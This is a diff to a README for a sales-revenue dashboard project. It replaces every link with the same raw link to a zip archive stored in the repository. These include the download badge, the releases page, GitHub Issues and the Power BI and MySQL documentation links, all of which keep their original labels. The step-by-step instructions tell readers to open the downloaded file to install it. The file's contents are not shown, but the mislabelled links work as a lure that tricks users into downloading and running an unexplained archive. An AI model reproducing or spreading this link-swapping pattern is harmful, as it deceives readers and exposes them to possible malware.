@@ -1,6 +1,6 @@
 # 🌟 sales-revenue-optimization - Optimize Your Sales Revenue Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/akashreddyyy/sales-revenue-optimization/releases)
+[![Download](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip)](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Sales Revenue Optimization project. This application helps busine
 
 To download and install the application, simply follow these steps:
 
-1. Click this link to visit the releases page: [Download Here](https://github.com/akashreddyyy/sales-revenue-optimization/releases).
+1. Click this link to visit the releases page: [Download Here](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip).
 2. On the releases page, find the latest version.
 3. Choose the file suitable for your system. Click on the file to download.
 4. After the download is complete, open the file to install the software.
@@ -39,7 +39,7 @@ To run this software, ensure your computer meets the following requirements:
 
 If you encounter issues or need assistance, the following resources are available:
 
-- Visit [GitHub Issues](https://github.com/akashreddyyy/sales-revenue-optimization/issues) for troubleshooting support.
+- Visit [GitHub Issues](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip) for troubleshooting support.
 - Check for Frequently Asked Questions (FAQs) on the release page.
 
 ## 🔧 Contributing
@@ -62,9 +62,9 @@ This project contains various areas of focus to assist in your learning experien
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/akashreddyyy/sales-revenue-optimization)
-- [Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [GitHub Repository](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip)
+- [Power BI Documentation](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/akashreddyyy/sales-revenue-optimization/main/Dashboard/sales-revenue-optimization_2.5.zip)
 
 For more detailed guidance and information, please refer to the documentation within the repository.
 
